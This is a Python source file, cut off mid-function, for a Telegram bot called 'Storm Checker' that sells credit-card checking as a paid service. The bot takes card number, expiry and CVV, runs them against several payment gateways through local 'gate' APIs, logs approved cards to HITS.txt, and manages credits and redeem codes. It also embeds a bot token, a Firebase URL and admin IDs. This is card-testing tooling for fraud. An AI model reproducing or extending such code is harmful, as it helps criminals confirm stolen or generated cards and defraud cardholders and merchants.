from fake_useragent import UserAgent
import telebot
import sys
from bs4 import BeautifulSoup
sys.stdout.reconfigure(encoding='utf-8')
from datetime import datetime, timedelta, timezone
import psutil
from urllib.parse import urlparse
from googlesearch import search
import platform
import json
import io
import subprocess
import sys
import re
from yt_dlp import YoutubeDL
import random
import string
import os
import threading
import schedule
from faker import Faker
from faker.config import AVAILABLE_LOCALES
import random
import time
import requests
from telebot import traceback, types

# Initialize Telegram bot
bot = telebot.TeleBot("7726872211:AAG5DNHpwZ5HBScTV9FzWBrP74g41FUp8pQ")
FIREBASE_BASE_URL = 'https://stormx-e9e8e-default-rtdb.firebaseio.com'

# Admin configuration
ADMIN_IDS = ["7820713047" , "7793593679"]
HITS_GROUP_ID = -1002846093039  # Replace with your group ID
APPROVED_GROUPS = set()
MAX_CARDS_LIMIT = 10  # Default maximum cards allowed in /mchk and /msq
MAX_SUBSCRIBED_CARDS_LIMIT = 30  # Increased limit for subscribed users
MAX_VBV_LIMIT = 20  # Limit for VBV checks for non-subscribed users
DAILY_CREDITS = 100  # Daily credits for non-subscribed users
CC_GENERATOR_URL = "https://drlabapis.onrender.com/api/ccgenerator?bin={}&count={}"
SQ_API_URL = "http://127.0.1:5000/key=dark/cc={}"
B3_API_URL = "https://b3-dark.onrender.com/gate=braintree/key=waslost/cc={}"
VBV_API_URL = "http://127.0.0.1:5202/key=darkwaslost/cc={}"
SS_API_URL = "http://127.0.0.1:1050/gate=s20/key=darkwaslost/cc={}"
CC_API_URL = "http://127.0.0.1:3333/gate=site/key=darkwasd4rk/cc={}"
AH_API_URL = "http://127.0.0.1:2367/gate=st5/key=darkwaslost/cc={}"
SF_API_URL = "http://127.0.0.1:1020/gate=s10/key=darkwaslost/cc={}"
B4_API_URL = "http://127.0.0.1:3366/key=never/cc={}"
PP_API_URL = "http://127.0.0.1:3335/gate=b3/key=wasdarkboy/cc={}"
PY_API_URL = "http://127.0.0.1:6566/gate=paypal/key=waslost/cc={}"
BR_API_URL = "http://127.0.0.1:9858/gate=br/key=waslost/cc={}"
BT_API_URL = "http://127.0.0.1:2222/gate=braintree/key=waslost/cc={}"
SVBV_API_URL = "http://127.0.0.1:6566/gate=vbv2/key=waslost/cc={}"
MO_API_URL = "http://127.0.0.1:3355/gate=pipeline/key=whoami/cc={}"
AD_API_URL = "http://127.0.0.1:5645/gate=mx/key=wasdarkboy/cc={}"
RN_API_URL = "http://127.0.0.1:8080/gate=stripeauth/key=darkdark/cc={}"
BOT_START_TIME = time.time()

def read_firebase(path):
    url = f"{FIREBASE_BASE_URL}/{path}.json"
    try:
        res = requests.get(url)
        if res.status_code == 200:
            return res.json() or {}
    except:
        return {}
    return {}

def write_firebase(path, data):
    url = f"{FIREBASE_BASE_URL}/{path}.json"
    try:
        res = requests.put(url, json=data)
        return res.status_code == 200
    except:
        return False

def update_firebase(path, data):
    url = f"{FIREBASE_BASE_URL}/{path}.json"
    try:
        res = requests.patch(url, json=data)
        return res.status_code == 200
    except:
        return False


ADMINS_FILE = "admins.json"


def load_admins():
    if os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, "r") as f:
            return set(json.load(f))
    return set(["6052940395"])  # fallback default

def save_admins():
    with open(ADMINS_FILE, "w") as f:
        json.dump(list(ADMIN_IDS), f)

# Load all data from Firebase at startup
USER_CREDITS = read_firebase("user_credits") or {}
SUBSCRIBED_USERS = read_firebase("subscribed_users") or {}
APPROVED_GROUPS = set(read_firebase("approved_groups") or {})
REDEEM_CODES = read_firebase("redeem_codes") or {}
BANNED_USERS = read_firebase("banned_users") or {}

# New way
APPROVED_GROUPS = set(read_firebase("approved_groups") or {})

# New way saving
write_firebase("approved_groups", list(APPROVED_GROUPS))

def get_remaining_credits(user_id):
    user_id_str = str(user_id)
    USER_CREDITS = read_firebase("user_credits")

    if user_id_str in USER_CREDITS:
        return USER_CREDITS[user_id_str].get('credits', DAILY_CREDITS)

    return DAILY_CREDITS


# Load user credits from Firebase
USER_CREDITS = {}

def load_user_credits():
    global USER_CREDITS
    USER_CREDITS = read_firebase("user_credits")

# Call this once at startup
load_user_credits()


# Load redeem codes
# New way
REDEEM_CODES = read_firebase("redeem_codes") or {}

# New way saving
write_firebase("redeem_codes", REDEEM_CODES)

# User flood control
USER_LAST_COMMAND = {}
USER_MASS_CHECK_COOLDOWN = {}

# Decline responses for B3
DECLINE_RESPONSES = [
    "Do Not Honor",
    "Closed Card",
    "Card Issuer Declined CVV",
    "Call Issuer. Pick Up Card.",
    "2108: Closed Card (51 : DECLINED)",
    "Processor Declined",
    "Credit card type is not accepted by this merchant account.",
    "Expired Card",
    "Transaction Not Allowed",
    "RISK: Retry this BIN later.",
    "CVV.",
    "Invalid postal code and cvv",
    "Cannot Authorize at this time (Policy)"
]

SUBSCRIBED_USERS = read_firebase("subscribed_users")

write_firebase("subscribed_users", SUBSCRIBED_USERS)

# Add these with other variables at the top
BANNED_USERS = {}
if os.path.exists('banned_users.json'):
    with open('banned_users.json', 'r') as f:
        BANNED_USERS = json.load(f)

def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
        if response.status_code == 200:
            return response.json()
        return None
    except:
        return None

def generate_redeem_code():
    """Generate a random 10-digit redeem code starting with Dark-"""
    prefix = "Dark-"
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=20))
    return prefix + suffix

def create_menu_buttons(active_button=None):
    markup = types.InlineKeyboardMarkup()
    markup.row_width = 2
    
    # Determine button texts based on active button
    gateway_text = "🔙 Home" if active_button == "gateway_commands" else "Gateway"
    admin_text = "🔙 Home" if active_button == "admin_commands" else "Admin"
    tools_text = "🔙 Home" if active_button == "tools_commands" else "Tools"
    charged_text = "🔙 Home" if active_button == "charged_commands" else "Charged"
    buy_text = "🔙 Home" if active_button == "buy_plans" else "Buy"
    
    markup.add(
        types.InlineKeyboardButton(gateway_text, callback_data="gateway_commands"),
        types.InlineKeyboardButton(admin_text, callback_data="admin_commands"),
        types.InlineKeyboardButton(tools_text, callback_data="tools_commands"),
        types.InlineKeyboardButton(charged_text, callback_data="charged_commands"),
        types.InlineKeyboardButton(buy_text, callback_data="buy_plans")
    )
    return markup

def show_main_menu(chat_id, message_id=None):
    welcome_text = """
✦ 𝑺𝒕𝒐𝒓𝒎 ✗ 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 𖤐

This bot checks credit cards using Auth.
"""
    image_url = "https://i.ibb.co/DHtLXvgV/photo-5843525765143054522-c.jpg"

    try:
        bot.send_photo(chat_id, photo=image_url, caption=welcome_text, reply_markup=create_menu_buttons(), parse_mode='HTML')
    except Exception as e:
        bot.send_message(chat_id, welcome_text, reply_markup=create_menu_buttons(), parse_mode='HTML')


def is_user_subscribed(user_id):
    user_id_str = str(user_id)
    if user_id_str in SUBSCRIBED_USERS:
        expiry_date = datetime.strptime(SUBSCRIBED_USERS[user_id_str]['expiry'], "%Y-%m-%d")
        if datetime.now() <= expiry_date:
            return True
    return False

def check_flood_control(user_id):
    now = time.time()
    if user_id in USER_LAST_COMMAND:
        last_time = USER_LAST_COMMAND[user_id]
        if now - last_time < 8:  # 5 seconds flood control
            return False
    USER_LAST_COMMAND[user_id] = now
    return True

def check_mass_check_cooldown(user_id):
    now = time.time()
    if user_id in USER_MASS_CHECK_COOLDOWN:
        last_time = USER_MASS_CHECK_COOLDOWN[user_id]
        if now - last_time < 8:  # 8 seconds cooldown
            return False
    USER_MASS_CHECK_COOLDOWN[user_id] = now
    return True

def check_user_credits(user_id, required_credits):
    user_id_str = str(user_id)

    # Reset credits at midnight KSA time (UTC+3)
    utc_now = datetime.now(timezone.utc)
    ksa_now = utc_now + timedelta(hours=3)
    today = str(ksa_now.date())

    # Load from Firebase
    USER_CREDITS = read_firebase("user_credits")

    # Reset if new day or not found
    if user_id_str not in USER_CREDITS or USER_CREDITS[user_id_str].get('date') != today:
        USER_CREDITS[user_id_str] = {
            'date': today,
            'credits': DAILY_CREDITS
        }
        write_firebase("user_credits", USER_CREDITS)

    if USER_CREDITS[user_id_str]['credits'] >= required_credits:
        return True
    return False

    
    if USER_CREDITS[user_id_str]['credits'] >= required_credits:
        return True
    return False

def deduct_credits(user_id, amount):
    user_id_str = str(user_id)

    # Load current credits from Firebase
    USER_CREDITS = read_firebase("user_credits")

    if user_id_str in USER_CREDITS:
        USER_CREDITS[user_id_str]['credits'] -= amount
        if USER_CREDITS[user_id_str]['credits'] < 0:
            USER_CREDITS[user_id_str]['credits'] = 0  # Avoid negative credits

        # Save updated credits back to Firebase
        write_firebase("user_credits", USER_CREDITS)

def get_remaining_credits(user_id):
    user_id_str = str(user_id)
    USER_CREDITS = read_firebase("user_credits")

    if user_id_str in USER_CREDITS:
        return USER_CREDITS[user_id_str].get('credits', DAILY_CREDITS)

    return DAILY_CREDITS


def check_if_banned(user_id):
    user_id = str(user_id)
    if user_id in BANNED_USERS:
        if BANNED_USERS[user_id] > time.time():
            remaining = BANNED_USERS[user_id] - time.time()
            hours = int(remaining // 3600)
            minutes = int((remaining % 3600) // 60)
            return f"❌ You are restricted from using this bot!\nTime remaining: {hours}h {minutes}m"
        else:
            del BANNED_USERS[user_id]
            with open('banned_users.json', 'w') as f:
                json.dump(BANNED_USERS, f)
    return None

def save_admins():
    with open(ADMINS_FILE, "w") as f:
        json.dump(ADMIN_IDS, f)

def broadcast_redeem_codes(codes):
    """Broadcast redeem codes to all users and groups"""
    try:
        if not codes:
            print("No codes to broadcast")
            return False

        # Format the message with supported HTML tags
        codes_list = "\n".join([f"<code>{code}</code>" for code in codes])
        message = f"""
<b>🎉 𝗡𝗲𝘄 𝗥𝗲𝗱𝗲𝗲𝗺 𝗖𝗼𝗱𝗲𝘀 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲!</b>

✧ 𝘈𝘮𝘰𝘶𝘯𝘵 : {len(codes)} codes
✧ 𝘝𝘢𝘭𝘶𝘦: 10 credits each 
✧ 𝘝𝘢𝘭𝘪𝘥𝘪𝘵𝘺: 5 days

{codes_list}

<b>How to redeem:</b>
Use /redeem CODE
Example: <code>/redeem {random.choice(codes)}</code>
"""

        # Get all recipients
        recipients = get_broadcast_recipients()
        if not recipients:
            print("No recipients found for broadcast")
            return False

        success_count = 0
        fail_count = 0

        # Send to all recipients with rate limiting
        for recipient in recipients:
            try:
                # Convert to integer if it's a group ID (negative)
                chat_id = int(recipient) if recipient.lstrip('-').isdigit() else recipient
                bot.send_message(chat_id, message, parse_mode='HTML')
                success_count += 1
                time.sleep(0.3)  # Rate limiting to avoid flooding
            except Exception as e:
                print(f"Failed to send to {recipient}: {str(e)}")
                fail_count += 1
                continue

        print(f"Broadcast completed: {success_count} successful, {fail_count} failed")
        return True

    except Exception as e:
        print(f"Broadcast failed: {str(e)}")
        return False

def get_broadcast_recipients():
    """Get all users and groups that should receive broadcasts"""
    recipients = set()
    
    try:
        # Add all users with credits
        user_credits = read_firebase("user_credits") or {}
        recipients.update(str(uid) for uid in user_credits.keys() if uid)
        
        # Add subscribed users
        subscribed_users = read_firebase("subscribed_users") or {}
        recipients.update(str(uid) for uid in subscribed_users.keys() if uid)
        
        # Add approved groups (stored as strings)
        approved_groups = read_firebase("approved_groups") or []
        recipients.update(str(gid) for gid in approved_groups if gid)
        
        # Filter out any None or empty values
        return [r for r in recipients if r and (r.lstrip('-').isdigit() or r.startswith('@'))]
    
    except Exception as e:
        print(f"Error getting recipients: {str(e)}")
        return []

def handle_generate(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Invalid format. Use /generate number or .generate number")
            return

        try:
            num_keys = int(parts[1])
            if num_keys <= 0:
                bot.reply_to(message, "❌ Number of keys must be at least 1")
                return
            elif num_keys > 50:
                num_keys = 50
                bot.reply_to(message, "⚠️ Maximum 50 keys at a time. Generating 50 keys.")
        except ValueError:
            bot.reply_to(message, "❌ Please provide a valid number")
            return

        # Generate keys
        keys = []
        for _ in range(num_keys):
            key = generate_redeem_code()
            keys.append(key)

            # Store key with expiry (5 days from now)
            expiry_date = datetime.now() + timedelta(days=5)
            REDEEM_CODES[key] = {
                'value': 10,
                'expiry': expiry_date.strftime("%Y-%m-%d"),
                'used': False,
                'used_by': None,
                'used_date': None
            }

        # Save to Firebase
        write_firebase("redeem_codes", REDEEM_CODES)

        # Format the keys for display (each in <code> tag)
        codes_list = "\n".join([f"<code>{key}</code>" for key in keys])
        response = f"<b>✅ Successfully Generated {num_keys} Redeem Codes!</b>\n\n{codes_list}"

        bot.reply_to(message, response, parse_mode='HTML')

        # Broadcast keys to all users and groups in background
        threading.Thread(target=broadcast_redeem_codes, args=(keys,)).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def check_new_api_cc(cc):
    try:
        # Normalize input
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]

        # Validate minimum length
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format: Use CC|MM|YY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe Auth'
            }

        cc_num = lista[0]
        mm = lista[1].zfill(2)
        yy_raw = lista[2]
        cvv = lista[3]

        # Safe YY conversion
        if yy_raw.startswith("20") and len(yy_raw) == 4:
            yy = yy_raw[2:]
        elif len(yy_raw) == 2:
            yy = yy_raw
        else:
            yy = '00'

        # BIN info fallback
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'

        # BIN lookup
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
                brand = bin_info.get('brand', 'UNKNOWN')
                country_name = bin_info.get('country_name', 'UNKNOWN')
                country_flag = bin_info.get('country_flag', '🌐')
                card_type = bin_info.get('type', 'UNKNOWN')
                bank = bin_info.get('bank', 'UNKNOWN')
        except Exception:
            pass

        # Final formatted card
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # API request
        try:
            response = requests.get(
                f"http://127.0.0.1:9090/gate=stripeauth/key=darkdark/cc={formatted_cc}",
                timeout=300
            )
            if response.status_code == 200:
                try:
                    data = response.json()
                    status = str(data.get('status', 'DECLINED')).upper()
                    message = str(data.get('response') or data.get('message') or 'Your card was declined.')
                except Exception:
                    status = 'ERROR'
                    message = 'Invalid response from API'
            else:
                status = 'ERROR'
                message = f"API error: {response.status_code}"

            # Final status normalization
            if 'APPROVED' in status:
                status = 'APPROVED'
                with open('HITS.txt', 'a') as hits:
                    hits.write(formatted_cc + '\n')
            elif 'DECLINED' in status:
                status = 'DECLINED'
            elif status not in ['APPROVED', 'DECLINED']:
                status = 'ERROR'

            return {
                'status': status,
                'card': formatted_cc,
                'message': message,
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe Auth'
            }

        except Exception as e:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f"Request error: {str(e)}",
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe Auth'
            }

    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f"Input error: {str(e)}",
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Stripe Auth'
        }

def check_square_cc(cc):
    try:
        card = cc.replace('/', '|')
        lista = card.split("|")
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        if "20" in yy:
            yy = yy.split("20")[1]
        cvv = lista[3]
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API
        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
        
        try:
            response = requests.get(SQ_API_URL.format(formatted_cc), timeout=300)
            if response.status_code == 200:
                data = response.json()
                status = data.get('status', 'DECLINED').upper()
                message = data.get('response', 'Your card was declined.')
                
                if status == 'APPROVED':
                    with open('HITS.txt','a') as hits:
                        hits.write(card+'\n')
                
                return {
                    'status': status,
                    'card': card,
                    'message': message,
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Stripe + Square [0.20$]'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': 'API Error',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Stripe + Square [0.20$]'
                }
        except Exception as e:
            return {
                'status': 'ERROR',
                'card': card,
                'message': str(e),
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe + Square [0.20$]'
            }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': card,
            'message': 'Invalid Input',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Stripe + Square [0.20$]'
        }

def check_b3_cc(cc):
    try:
        # Normalize input format (accept various separators and formats)
        card = cc.replace('/', '|').replace(' ', '|').replace(':', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]
        
        # Validate we have all required parts
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format. Use CC|MM|YYYY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth'
            }
        
        cc_num = lista[0]
        mm = lista[1].zfill(2)  # Ensure 2-digit month (e.g., 3 becomes 03)
        yy_raw = lista[2]
        cvv = lista[3]
        
        # Normalize year to 4 digits - FIXED LOGIC
        if len(yy_raw) == 2:  # 2-digit year provided
            current_year_short = datetime.now().year % 100
            input_year = int(yy_raw)
            if input_year >= current_year_short - 10:  # Consider years within 10 years range
                yy = '20' + yy_raw  # 22 → 2022
            else:
                yy = '20' + yy_raw  # Default to 20xx for all 2-digit years
        elif len(yy_raw) == 4:  # 4-digit year provided
            yy = yy_raw
        else:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid year format (use YY or YYYY)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth'
            }
        
        # Validate card number length
        if not (13 <= len(cc_num) <= 19):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card number length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth'
            }
        
        # Validate month
        if not (1 <= int(mm) <= 12):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid month (1-12)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth'
            }
        
        # Validate CVV
        if not (3 <= len(cvv) <= 4):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid CVV length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth'
            }
        
        # Check expiration (using normalized values)
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if int(yy) < current_year or (int(yy) == current_year and int(mm) < current_month):
            return {
                'status': 'DECLINED',
                'card': f"{cc_num}|{mm}|{yy}|{cvv}",
                'message': 'Your card is expired',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth'
            }
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API - in perfect CC|MM|YYYY|CVV format
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
            
            # Increased timeout to 60 seconds
            response = requests.get(B3_API_URL.format(formatted_cc), headers=headers, timeout=180)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth'
                    }
                    
                status = data.get('status', 'Declined ❌')
                message = data.get('response', 'Your card was declined.')
                
                # Improved status detection
                if any(word in status for word in ['Live', 'Approved', 'APPROVED', 'Success']):
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(formatted_cc+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth'
                    }
                elif any(word in status for word in ['Declined', 'Decline', 'Failed', 'Error']):
                    return {
                        'status': 'DECLINED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth'
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Unknown response from API',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth'
                }
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if "Read timed out" in error_msg:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': 'API Timeout (60s) - Server may be busy',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'Request failed: {str(e)}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth'
                }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Invalid Input: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Braintree Premium Auth'
        }

def check_vbv_cc(cc):
    try:
        card = cc.replace('/', '|')
        lista = card.split("|")
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card format',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': '3DS Lookup'
            }
            
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        if "20" in yy:
            yy = yy.split("20")[1]
        cvv = lista[3]
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API
        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
        
        try:
            response = requests.get(VBV_API_URL.format(formatted_cc), timeout=300)
            if response.status_code == 200:
                try:
                    data = response.json()
                    # Clean and standardize status and message
                    status = str(data.get('status', 'DECLINED')).upper().strip()
                    message = str(data.get('response', 'Your card was declined.')).strip()
                    
                    # Remove any emoji/unicode from status for processing
                    clean_status = ''.join(char for char in status if char.isalpha())
                    
                    if any(x in clean_status for x in ['PASS', 'APPROVE', 'SUCCESS', 'LIVE']):
                        final_status = 'APPROVED'
                        # Clean message by removing success indicators
                        message = message.replace('✅', '').replace('✧', '').strip()
                        with open('HITS.txt','a') as hits:
                            hits.write(card+'\n')
                    else:
                        final_status = 'DECLINED'
                        # Clean message by removing error indicators
                        message = message.replace('❌', '').replace('✗', '').strip()
                    
                    return {
                        'status': final_status,
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': '3DS Lookup'
                    }
                    
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': card,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': '3DS Lookup'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': '3DS Lookup'
                }
        except requests.exceptions.Timeout:
            return {
                'status': 'ERROR',
                'card': card,
                'message': 'API Timeout',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': '3DS Lookup'
            }
        except Exception as e:
            return {
                'status': 'ERROR',
                'card': card,
                'message': f'Request Exception: {str(e)}',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': '3DS Lookup'
            }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc if 'card' not in locals() else card,
            'message': f'Processing Error: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': '3DS Lookup'
        }

def check_cc_cc(cc):
    try:
        card = cc.replace('/', '|')
        lista = card.split("|")
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        if "20" in yy:
            yy = yy.split("20")[1]
        cvv = lista[3]
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API
        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
        
        try:
            response = requests.get(CC_API_URL.format(formatted_cc), timeout=300)
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': card,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Site Based [1$]'
                    }
                    
                status = data.get('status', 'Declined ❌').replace('Declined ❌', 'DECLINED').replace('Declined \u274c', 'DECLINED')
                message = data.get('response', 'Your card was declined.')
                
                if 'Live' in status or 'Approved' in status:
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(card+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Site Based [1$]'
                    }
                else:
                    return {
                        'status': 'DECLINED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Site Based [1$]'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Site Based [1$]'
                }
        except requests.exceptions.Timeout:
            return {
                'status': 'ERROR',
                'card': card,
                'message': 'API Timeout',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Site Based [1$]'
            }
        except Exception as e:
            return {
                'status': 'ERROR',
                'card': card,
                'message': str(e),
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Site Based [1$]'
            }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': card,
            'message': 'Invalid Input',
